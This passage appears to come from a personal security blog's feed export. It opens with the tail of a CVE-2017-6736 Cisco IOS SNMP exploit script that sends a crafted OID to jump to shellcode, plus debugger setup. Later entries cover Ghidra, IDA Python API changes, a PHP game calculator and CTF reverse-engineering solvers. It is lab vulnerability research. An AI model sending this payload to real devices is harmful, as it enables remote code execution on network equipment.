      <span class="keyword">if</span> <span class="string">&#x27;capstone&#x27;</span> <span class="keyword">in</span> sys.modules: </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(sh_dword, cur_addr):</span><br><span class="line">                color = <span class="string">&#x27;green&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s&quot;</span> %(cur_addr, sh_dword.encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">            </span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    ans = raw_input(<span class="string">&quot;Jump to shellcode? [yes]: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ans == <span class="string">&#x27;yes&#x27;</span>:</span><br><span class="line">        ra = bin2oid(shift(shellcode_start, <span class="number">0xa4</span>)) <span class="comment"># return control flow jumping over 1 stack frame</span></span><br><span class="line">        zero = bin2oid(<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">        payload = alps_oid.<span class="built_in">format</span>(zero, zero, zero, zero, zero, zero, zero, ra, zero, zero, zero, zero)</span><br><span class="line">        send(IP(dst=args.host)/UDP(sport=<span class="number">161</span>,dport=<span class="number">161</span>)/SNMP(community=args.community,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=payload)])))</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Jump taken!&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>gdb 连接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">set architecture powerpc:MPC8XX</span><br><span class="line">set endian big</span><br></pre></td></tr></table></figure>
<p>端口转发（这里用的 wsl 所以需要。。。）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat -T 600 TCP-LISTEN:1234,fork,reuseaddr TCP:172.17.0.2:1234 &amp;</span><br></pre></td></tr></table></figure>
<p>ida attach 进去即可</p>
<h3 id="分析"><a class="markdownIt-Anchor" href="#分析">#</a> 分析：</h3>
<p>参考资料：<a href="https://www.anquanke.com/post/id/98225">CVE-2017-6736 思科 IOS 系统远程代码执行漏洞分析 - 安全客 - 安全资讯平台 (anquanke.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>Ghidra初探</title>
    <url>/2023/11/27/Ghidra%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface之前是能不用就不用现在遇到第二次不用不行了xdm和ghidra爆了"><a class="markdownIt-Anchor" href="#preface之前是能不用就不用现在遇到第二次不用不行了xdm和ghidra爆了">#</a> PREFACE：之前是能不用就不用，现在遇到第二次不用不行了，xdm，和 Ghidra 爆了！</h6>
<h6 id="这一篇仅介绍ghidra一些操作开发等等暂时没这个水平5555555555"><a class="markdownIt-Anchor" href="#这一篇仅介绍ghidra一些操作开发等等暂时没这个水平5555555555">#</a> 这一篇仅介绍 Ghidra 一些操作，开发等等暂时没这个水平 5555555555</h6>
<span id="more"></span>
<p>先偷一个队里爷的<a href="https://blog.gaoyucan.site/posts/ghidra-%E4%BD%BF%E7%94%A8%E5%8F%8A%E9%85%8D%E7%BD%AE/"> Ghidra 使用及配置 (gaoyucan.site)</a></p>
<h6 id="刚想写他就发了那就先偷-反正todo还多"><a class="markdownIt-Anchor" href="#刚想写他就发了那就先偷-反正todo还多">#</a> （刚想写他就发了，那就先偷 <s>反正 TODO 还多</s>）</h6>
]]></content>
  </entry>
  <entry>
    <title>Changes of Python API in IDA</title>
    <url>/2022/09/25/Changes-of-Python-API-in-IDA/</url>
    <content><![CDATA[<h1 id="changes-of-python-api-in-ida-7x"><a class="markdownIt-Anchor" href="#changes-of-python-api-in-ida-7x">#</a> Changes of Python API in IDA 7.x</h1>
<span id="more"></span>
<h4 id="from-ida-6x-to-ida-7x-there-has-been-lots-of-changes-and-as-a-green-hands-when-i-look-up-at-some-writes-up-some-method-just-didnt-work-out-thats-when-i-knew-that-many-python-api-has-change-from-ida-6x-to-ida-7x"><a class="markdownIt-Anchor" href="#from-ida-6x-to-ida-7x-there-has-been-lots-of-changes-and-as-a-green-hands-when-i-look-up-at-some-writes-up-some-method-just-didnt-work-out-thats-when-i-knew-that-many-python-api-has-change-from-ida-6x-to-ida-7x">#</a> From IDA 6.x to IDA 7.x, there has been lots of changes. And as a green hands, when I look up at some writes up, some method just didn’t work out. That’s when I knew that many python API has change from IDA 6.x to IDA 7.x.</h4>
<h4 id="website-that-may-help-you"><a class="markdownIt-Anchor" href="#website-that-may-help-you">#</a> Website that may help you:</h4>
<h4 id="blog-in-chinese"><a class="markdownIt-Anchor" href="#blog-in-chinese">#</a> <a href="https://ybrc.github.io/zh-cn/14-2/">blog in chinese</a></h4>
<h4 id="idapython-documentation"><a class="markdownIt-Anchor" href="#idapython-documentation">#</a> <a href="https://hex-rays.com/products/ida/support/idapython_docs/">IDAPython documentation</a></h4>
<h4 id="hex-rays"><a class="markdownIt-Anchor" href="#hex-rays">#</a> <a href="https://hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">hex-rays</a></h4>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>reverse</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>arknights recruit calculator(1)</title>
    <url>/2022/08/27/arknights-recruit-calculator/</url>
    <content><![CDATA[<h1 id="arknights-recruit-calculator1"><a class="markdownIt-Anchor" href="#arknights-recruit-calculator1">#</a> arknights recruit calculator(1)</h1>
<h5 id="published-20220827"><a class="markdownIt-Anchor" href="#published-20220827">#</a> Published: 2022/08/27</h5>
<h5 id="updated-20220827"><a class="markdownIt-Anchor" href="#updated-20220827">#</a> Updated: 2022/08/27</h5>
<h3 id="preface"><a class="markdownIt-Anchor" href="#preface">#</a> PREFACE</h3>
<ul>
<li>I’m pretty addicted to this game named Arknights these days, and there is this module named “公招”(“recruit” in English or whatever). So there is this calculator tools use to help you recruit what you want on website. One day it the website/procedure were been maintained. And I been studying php for couples of days. That’s when I decided to build my own recruit calculator.</li>
<li>It’s still in testing phase, when it’s complete, I may put it on a website.</li>
<li>The php function mention below can be consulted on <a href="https://www.php.net/">php.net</a></li>
</ul>
<span id="more"></span>
<hr>
<p>I use html, css to create the User Interface. User can input their tags(5 at most in one post), and program will output the cadres that fits(It will print all combination of the tags that are input).</p>
<p>The UI designed was easy(not to pursue a perfect, that is), just use a POST method and let the php program receive it. The backend devided the STRING into array, and search in the mysql.</p>
<p>There is this problem that HOW TO ESTABLISH THE SQL? There isn’t a sql you can find so easily that is ready made. The closest thing I found was a python dictionary. I wasn’t going to wrote the program in python. So I need to transform it into a PHP ARRAY. At first, I tried to use C to read the py dictionary. Obviously it’s too complicate and I should have better choose– <code>json.dumps()</code> ,a function in python that can transform a dictionary into a json file. Like this:</p>
<blockquote>
<p><code>a=json.dumps(list)</code> <br>
However, it outputted errors. There I knew json.dumps cann’t dail with Chinese. So I searched for solutions and code down whese:</p>
</blockquote>
<blockquote>
<p><code>import json</code> <br>
 <code>import numpy as np</code> <br>
 <code>class Encoder(json.JSONEncoder):</code> <br>
 <code>    def default(self, obj):</code> <br>
 <code>        if isinstance(obj, np.ndarray):</code> <br>
 <code>            return obj.tolist()</code> <br>
 <code>        elif isinstance(obj, bytes):</code> <br>
 <code>            return str(obj, encoding='utf-8')</code> <br>
 <code>        return json.JSONEncoder.default(self, obj)</code> <br>
 <code>a=json.dumps(top_operators_list,cls=Encoder)</code> <br>
 <code>with open('tags.txt','a') as file0:</code> <br>
 <code>    print(a,file=file0)</code> <br>
It actually still output error. After few hours, I found the dictionary’s array used “{}” instead of “[]”. Correct all of that, it works and I got a json file containing the data I need.</p>
</blockquote>
<p>Now, I need to put the data in json file into a php array. Luckly, there is this function  <code>json_decode</code>  that can do the trick. So now the array was prepared.</p>
<p>To search the cadres, you can combine the array into a string in full permutation.(USING DFS) (TIPS:sort your string each time you search will make the work much easier.)</p>
<p>Designed the output UI, and it’s all done!</p>
]]></content>
      <tags>
        <tag>tools</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>ISITDTUCTF</title>
    <url>/2023/10/17/ISITDTUCTF/</url>
    <content><![CDATA[<h6 id="preface最近确实作业很多题只能慢慢写吧9-17小做了四个比较ez的"><a class="markdownIt-Anchor" href="#preface最近确实作业很多题只能慢慢写吧9-17小做了四个比较ez的">#</a> PREFACE：最近确实作业很多，题只能慢慢写吧，9-17：小做了四个比较 ez 的</h6>
<span id="more"></span>
<h3 id="re01"><a class="markdownIt-Anchor" href="#re01">#</a> re01</h3>
<p>核心加密部分：</p>
<p><img loading="lazy" data-src="ISITDTUCTF/image-20231017081840615.png" alt="image-20231017081840615"></p>
<p>翻译为循环：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ISITDTU&#123;11111111aaaaaaaa&#125;</span></span><br><span class="line">prime = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>,<span class="number">101</span>,</span><br><span class="line"><span class="number">103</span>,<span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>,<span class="number">127</span>,<span class="number">131</span>,<span class="number">137</span>,<span class="number">139</span>,<span class="number">149</span>,<span class="number">151</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">167</span>,<span class="number">173</span>,<span class="number">179</span>,<span class="number">181</span>,<span class="number">191</span>,<span class="number">193</span>,<span class="number">197</span>,<span class="number">199</span>,</span><br><span class="line"><span class="number">211</span>,<span class="number">223</span>,<span class="number">227</span>,<span class="number">229</span>,<span class="number">233</span>,<span class="number">239</span>,<span class="number">241</span>,<span class="number">251</span>,<span class="number">257</span>,<span class="number">263</span>,<span class="number">269</span>,<span class="number">271</span>,<span class="number">277</span>,<span class="number">281</span>,<span class="number">283</span>,<span class="number">293</span>,<span class="number">307</span>,<span class="number">311</span>,<span class="number">313</span>,<span class="number">317</span>,</span><br><span class="line"><span class="number">331</span>,<span class="number">337</span>,<span class="number">347</span>,<span class="number">349</span>,<span class="number">353</span>,<span class="number">359</span>,<span class="number">367</span>,<span class="number">373</span>,<span class="number">379</span>,<span class="number">383</span>,<span class="number">389</span>,<span class="number">397</span>,<span class="number">401</span>,<span class="number">409</span>,<span class="number">419</span>,<span class="number">421</span>,<span class="number">431</span>,<span class="number">433</span>,<span class="number">439</span>,<span class="number">443</span>,</span><br><span class="line"><span class="number">449</span>,<span class="number">457</span>,<span class="number">461</span>,<span class="number">463</span>,<span class="number">467</span>,<span class="number">479</span>,<span class="number">487</span>,<span class="number">491</span>,<span class="number">499</span>,<span class="number">503</span>,<span class="number">509</span>,<span class="number">521</span>,<span class="number">523</span>,<span class="number">541</span>,<span class="number">547</span>,<span class="number">557</span>,<span class="number">563</span>,<span class="number">569</span>,<span class="number">571</span>,<span class="number">577</span>,</span><br><span class="line"><span class="number">587</span>,<span class="number">593</span>,<span class="number">599</span>,<span class="number">601</span>,<span class="number">607</span>,<span class="number">613</span>,<span class="number">617</span>,<span class="number">619</span>,<span class="number">631</span>,<span class="number">641</span>,<span class="number">643</span>,<span class="number">647</span>,<span class="number">653</span>,<span class="number">659</span>,<span class="number">661</span>,<span class="number">673</span>,<span class="number">677</span>,<span class="number">683</span>,<span class="number">691</span>,<span class="number">701</span>,</span><br><span class="line"><span class="number">709</span>,<span class="number">719</span>,<span class="number">727</span>,<span class="number">733</span>,<span class="number">739</span>,<span class="number">743</span>,<span class="number">751</span>,<span class="number">757</span>,<span class="number">761</span>,<span class="number">769</span>,<span class="number">773</span>,<span class="number">787</span>,<span class="number">797</span>,<span class="number">809</span>,<span class="number">811</span>,<span class="number">821</span>,<span class="number">823</span>,<span class="number">827</span>,<span class="number">829</span>,<span class="number">839</span>,</span><br><span class="line"><span class="number">853</span>,<span class="number">857</span>,<span class="number">859</span>,<span class="number">863</span>,<span class="number">877</span>,<span class="number">881</span>,<span class="number">883</span>,<span class="number">887</span>,<span class="number">907</span>,<span class="number">911</span>,<span class="number">919</span>,<span class="number">929</span>,<span class="number">937</span>,<span class="number">941</span>,<span class="number">947</span>,<span class="number">953</span>,<span class="number">967</span>,<span class="number">971</span>,<span class="number">977</span>,<span class="number">983</span>,</span><br><span class="line"><span class="number">991</span>,<span class="number">997</span>,<span class="number">1009</span>,<span class="number">1013</span>,<span class="number">1019</span>,<span class="number">1021</span>,<span class="number">1031</span>,<span class="number">1033</span>,<span class="number">1039</span>,<span class="number">1049</span>,<span class="number">1051</span>,<span class="number">1061</span>,<span class="number">1063</span>,<span class="number">1069</span>,<span class="number">1087</span>,<span class="number">1091</span>,<span class="number">1093</span>,</span><br><span class="line"><span class="number">1097</span>,<span class="number">1103</span>,<span class="number">1109</span>,<span class="number">1117</span>,<span class="number">1123</span>,<span class="number">1129</span>,<span class="number">1151</span>,<span class="number">1153</span>,<span class="number">1163</span>,<span class="number">1171</span>,<span class="number">1181</span>,<span class="number">1187</span>,<span class="number">1193</span>,<span class="number">1201</span>,<span class="number">1213</span>,<span class="number">1217</span>,<span class="number">1223</span>,</span><br><span class="line"><span class="number">1229</span>,<span class="number">1231</span>,<span class="number">1237</span>,<span class="number">1249</span>,<span class="number">1259</span>,<span class="number">1277</span>,<span class="number">1279</span>,<span class="number">1283</span>,<span class="number">1289</span>,<span class="number">1291</span>,<span class="number">1297</span>,<span class="number">1301</span>,<span class="number">1303</span>,<span class="number">1307</span>,<span class="number">1319</span>,<span class="number">1321</span>,<span class="number">1327</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(prime))</span><br><span class="line">v14 = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        v14[<span class="number">5</span> * k + m] = prime[k * <span class="number">5</span> + m]</span><br><span class="line"><span class="built_in">print</span>(v14)</span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x4CFC</span>,<span class="number">0x52A8</span>,<span class="number">0x5AA2</span>,<span class="number">0x651C</span>,<span class="number">0x4881</span>,<span class="number">0x5203</span>,<span class="number">0x57DF</span>,<span class="number">0x6043</span>,<span class="number">0x6B51</span>,<span class="number">0x49C6</span>,<span class="number">0x538F</span>,<span class="number">0x5975</span>,<span class="number">0x6231</span>,<span class="number">0x6D6B</span>,<span class="number">0x42DC</span>,<span class="number">0x4C10</span>,<span class="number">0x51AC</span>,<span class="number">0x59B8</span>,<span class="number">0x6448</span>,<span class="number">0x1F63</span>,<span class="number">0x2475</span>,<span class="number">0x27C9</span>,<span class="number">0x2C8D</span>,<span class="number">0x333F</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">global</span> <span class="built_in">map</span>, prime</span><br><span class="line">    output = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                output[<span class="number">5</span> * i + j] += prime[<span class="number">5</span> * k + j] * a[<span class="number">5</span> * i + k]</span><br></pre></td></tr></table></figure>
<p>z3 求解即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span> = [Int(<span class="string">f&#x27;input_<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line"></span><br><span class="line">count_5 = <span class="number">5</span></span><br><span class="line">count_5_1 = <span class="number">5</span></span><br><span class="line">count_5_2 = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">a6 = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>,<span class="number">101</span>,</span><br><span class="line"><span class="number">103</span>,<span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>,<span class="number">127</span>,<span class="number">131</span>,<span class="number">137</span>,<span class="number">139</span>,<span class="number">149</span>,<span class="number">151</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">167</span>,<span class="number">173</span>,<span class="number">179</span>,<span class="number">181</span>,<span class="number">191</span>,<span class="number">193</span>,<span class="number">197</span>,<span class="number">199</span>,</span><br><span class="line"><span class="number">211</span>,<span class="number">223</span>,<span class="number">227</span>,<span class="number">229</span>,<span class="number">233</span>,<span class="number">239</span>,<span class="number">241</span>,<span class="number">251</span>,<span class="number">257</span>,<span class="number">263</span>,<span class="number">269</span>,<span class="number">271</span>,<span class="number">277</span>,<span class="number">281</span>,<span class="number">283</span>,<span class="number">293</span>,<span class="number">307</span>,<span class="number">311</span>,<span class="number">313</span>,<span class="number">317</span>,</span><br><span class="line"><span class="number">331</span>,<span class="number">337</span>,<span class="number">347</span>,<span class="number">349</span>,<span class="number">353</span>,<span class="number">359</span>,<span class="number">367</span>,<span class="number">373</span>,<span class="number">379</span>,<span class="number">383</span>,<span class="number">389</span>,<span class="number">397</span>,<span class="number">401</span>,<span class="number">409</span>,<span class="number">419</span>,<span class="number">421</span>,<span class="number">431</span>,<span class="number">433</span>,<span class="number">439</span>,<span class="number">443</span>,</span><br><span class="line"><span class="number">449</span>,<span class="number">457</span>,<span class="number">461</span>,<span class="number">463</span>,<span class="number">467</span>,<span class="number">479</span>,<span class="number">487</span>,<span class="number">491</span>,<span class="number">499</span>,<span class="number">503</span>,<span class="number">509</span>,<span class="number">521</span>,<span class="number">523</span>,<span class="number">541</span>,<span class="number">547</span>,<span class="number">557</span>,<span class="number">563</span>,<span class="number">569</span>,<span class="number">571</span>,<span class="number">577</span>,</span><br><span class="line"><span class="number">587</span>,<span class="number">593</span>,<span class="number">599</span>,<span class="number">601</span>,<span class="number">607</span>,<span class="number">613</span>,<span class="number">617</span>,<span class="number">619</span>,<span class="number">631</span>,<span class="number">641</span>,<span class="number">643</span>,<span class="number">647</span>,<span class="number">653</span>,<span class="number">659</span>,<span class="number">661</span>,<span class="number">673</span>,<span class="number">677</span>,<span class="number">683</span>,<span class="number">691</span>,<span class="number">701</span>,</span><br><span class="line"><span class="number">709</span>,<span class="number">719</span>,<span class="number">727</span>,<span class="number">733</span>,<span class="number">739</span>,<span class="number">743</span>,<span class="number">751</span>,<span class="number">757</span>,<span class="number">761</span>,<span class="number">769</span>,<span class="number">773</span>,<span class="number">787</span>,<span class="number">797</span>,<span class="number">809</span>,<span class="number">811</span>,<span class="number">821</span>,<span class="number">823</span>,<span class="number">827</span>,<span class="number">829</span>,<span class="number">839</span>,</span><br><span class="line"><span class="number">853</span>,<span class="number">857</span>,<span class="number">859</span>,<span class="number">863</span>,<span class="number">877</span>,<span class="number">881</span>,<span class="number">883</span>,<span class="number">887</span>,<span class="number">907</span>,<span class="number">911</span>,<span class="number">919</span>,<span class="number">929</span>,<span class="number">937</span>,<span class="number">941</span>,<span class="number">947</span>,<span class="number">953</span>,<span class="number">967</span>,<span class="number">971</span>,<span class="number">977</span>,<span class="number">983</span>,</span><br><span class="line"><span class="number">991</span>,<span class="number">997</span>,<span class="number">1009</span>,<span class="number">1013</span>,<span class="number">1019</span>,<span class="number">1021</span>,<span class="number">1031</span>,<span class="number">1033</span>,<span class="number">1039</span>,<span class="number">1049</span>,<span class="number">1051</span>,<span class="number">1061</span>,<span class="number">1063</span>,<span class="number">1069</span>,<span class="number">1087</span>,<span class="number">1091</span>,<span class="number">1093</span>,</span><br><span class="line"><span class="number">1097</span>,<span class="number">1103</span>,<span class="number">1109</span>,<span class="number">1117</span>,<span class="number">1123</span>,<span class="number">1129</span>,<span class="number">1151</span>,<span class="number">1153</span>,<span class="number">1163</span>,<span class="number">1171</span>,<span class="number">1181</span>,<span class="number">1187</span>,<span class="number">1193</span>,<span class="number">1201</span>,<span class="number">1213</span>,<span class="number">1217</span>,<span class="number">1223</span>,</span><br><span class="line"><span class="number">1229</span>,<span class="number">1231</span>,<span class="number">1237</span>,<span class="number">1249</span>,<span class="number">1259</span>,<span class="number">1277</span>,<span class="number">1279</span>,<span class="number">1283</span>,<span class="number">1289</span>,<span class="number">1291</span>,<span class="number">1297</span>,<span class="number">1301</span>,<span class="number">1303</span>,<span class="number">1307</span>,<span class="number">1319</span>,<span class="number">1321</span>,<span class="number">1327</span>]</span><br><span class="line">output = [<span class="number">0x43AD</span>, <span class="number">0x4CFC</span>,<span class="number">0x52A8</span>,<span class="number">0x5AA2</span>,<span class="number">0x651C</span>,<span class="number">0x4881</span>,<span class="number">0x5203</span>,<span class="number">0x57DF</span>,<span class="number">0x6043</span>,<span class="number">0x6B51</span>,<span class="number">0x49C6</span>,<span class="number">0x538F</span>,<span class="number">0x5975</span>,<span class="number">0x6231</span>,<span class="number">0x6D6B</span>,<span class="number">0x42DC</span>,<span class="number">0x4C10</span>,<span class="number">0x51AC</span>,<span class="number">0x59B8</span>,<span class="number">0x6448</span>,<span class="number">0x1F63</span>,<span class="number">0x2475</span>,<span class="number">0x27C9</span>,<span class="number">0x2C8D</span>,<span class="number">0x333F</span>,<span class="number">0x7F78</span>]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count_5):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(count_5_2):</span><br><span class="line">        sum_expr = Sum([a6[<span class="number">5</span> * k + j] * <span class="built_in">input</span>[<span class="number">5</span> * i + k] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(count_5_1)])</span><br><span class="line">        s.add(output[<span class="number">5</span> * i + j] == sum_expr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    solution = [m[<span class="built_in">input</span>[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Solution for input array:&quot;</span>, solution)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found&quot;</span>)</span><br><span class="line"></span><br><span class="line">x = [<span class="number">103</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">95</span>, <span class="number">106</span>, <span class="number">111</span>, <span class="number">98</span>, <span class="number">95</span>, <span class="number">121</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">95</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">33</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># good_job_you_solved_re01!</span></span><br></pre></td></tr></table></figure>
<h3 id="dot"><a class="markdownIt-Anchor" href="#dot">#</a> dot</h3>
<p>检测 <code>osname</code> ，然后进行魔改的 morse 编码，与密文对照</p>
<p>golang 写的，反编译几乎没法看，看汇编即可</p>
<p>魔改的 morse 编码可以不用逆，看出来是一一映射的加密即可，动态 patch 检测的 <code>osname</code> （注意第二个返回值是 osname 的长度，也需要 patch）写入表，在加密过程后获得表，与密文对照即可获得 flag</p>
<p>(这里前面有将所有字符变为大写，最后直接交全大写即可)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">map</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#123;&#125;-&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;-... -.-. ..... --. -- --.- .--. .--- -.... .-.. ..- _ --- - ....- .. ...- .---- .-- ----- --.. -..- -.-- ...-- ..--- .-. -... -.-. ..... --. -- --.- .--. .--- -.... .-.. ..- _ --- - ....- .. ...- .---- .-- ----- --.. -..- -.-- ...-- ..--- .-. . -.. --... ----. -.- ---.. .- ..-. .... ... &#x27;</span></span><br><span class="line">a = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">b = <span class="string">&#x27;..... ... --- .. --.. ----- --... .---- --. ----- --.. -.-- --... _ ..... ... --- --...&#x27;</span></span><br><span class="line">b = b.split()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        <span class="keyword">if</span> (i == a[j]):</span><br><span class="line">            <span class="comment"># print(map[j],end=&#x27;&#x27;)</span></span><br><span class="line">            flag += <span class="built_in">map</span>[j]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">flag = flag.upper()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># C0MPUT3RDTUW3LC0M3</span></span><br></pre></td></tr></table></figure>
<h3 id="sanity_check"><a class="markdownIt-Anchor" href="#sanity_check">#</a> sanity_check</h3>
<p>go 的反编译完全的就是…</p>
<p>硬看汇编即可，对着栈看（这里被 nop 掉的即为判断并跳出循环的）</p>
<p><img loading="lazy" data-src="ISITDTUCTF/image-20231017142409397.png" alt="image-20231017142409397"></p>
<p>前面一直没注意到 <code>main_calc</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main_calc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// r14</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+10h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)&amp;retaddr &lt;= *(_QWORD *)(v1 + <span class="number">16</span>) )</span><br><span class="line">    <span class="built_in">runtime_morestack_noctxt_abi0</span>();</span><br><span class="line">  <span class="keyword">if</span> ( result &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">main_calc</span>();</span><br><span class="line">    <span class="keyword">return</span> v2 + <span class="built_in">main_calc</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是一个斐波那契数列，然后结合汇编发现，和 flag 进行异或即可</p>
<p>实际上，这里也可以断在合适的位置，直接在栈中找到 flag</p>
<p><img loading="lazy" data-src="ISITDTUCTF/image-20231017142853962.png" alt="image-20231017142853962"></p>
<p>解密 exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">0x54</span>,<span class="number">0x69</span>,<span class="number">0x68</span>,<span class="number">0x71</span>,<span class="number">0x5C</span>,<span class="number">0x4C</span>,<span class="number">0x7B</span>,<span class="number">0x52</span>,<span class="number">0x42</span>,<span class="number">0x4A</span>,<span class="number">0x52</span>,<span class="number">0x2B</span>,<span class="number">0x0F5</span>,<span class="number">0x0B6</span>,<span class="number">0x120</span>,<span class="number">0x20D</span>,<span class="number">0x3AE</span>,<span class="number">0x64F</span>,<span class="number">0x0A47</span>,<span class="number">0x1007</span>,<span class="number">0x1A28</span>,<span class="number">0x2A9D</span>,<span class="number">0x4565</span>,<span class="number">0x6F9E</span>,<span class="number">0x0B555</span>,<span class="number">0x12563</span>,<span class="number">0x1DA5F</span>,<span class="number">0x2FF27</span>,<span class="number">0x4D90A</span>,<span class="number">0x7D8EA</span>,<span class="number">0x0CB26A</span>,<span class="number">0x148AB8</span>,<span class="number">0x213D62</span>,<span 